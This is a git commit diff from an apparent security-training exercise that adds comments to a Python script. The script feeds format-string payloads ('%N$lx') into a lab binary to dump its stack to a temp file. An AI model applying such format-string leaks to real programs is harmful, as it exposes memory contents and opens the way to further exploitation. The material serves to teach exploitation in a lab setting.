7ffa94ef06a9a514f1e449d528690b593c844dc6
moannuo <ademenet@e2r8p15.42.fr>
2018-05-29 13:49:46 +0200

    Update level02

--- level02/Resources/dump_stack.py
+++ level02/Resources/dump_stack.py
@@ -1,6 +1,10 @@
 import os
 
 for i in range(1, 400):
+    # For example, the command for the first step is:
+    # $> python -c 'print "%1$lx\n"' | ~/level02 | grep "does not have access!" >> /tmp/level02_dump
+    # It is saved inside /tmp/level02_dump.
+    # It allows us to dump the stack.
     arg1 = "python -c \'print \"%" + str(i) + "$lx" + "\\n\"\'"
     cmd = arg1 + " | ~/level02 | grep \"does not have access!\" >> /tmp/level02_dump"
     os.system("echo -n \"=== " + str(i) + " : \" >> /tmp/level02_dump")
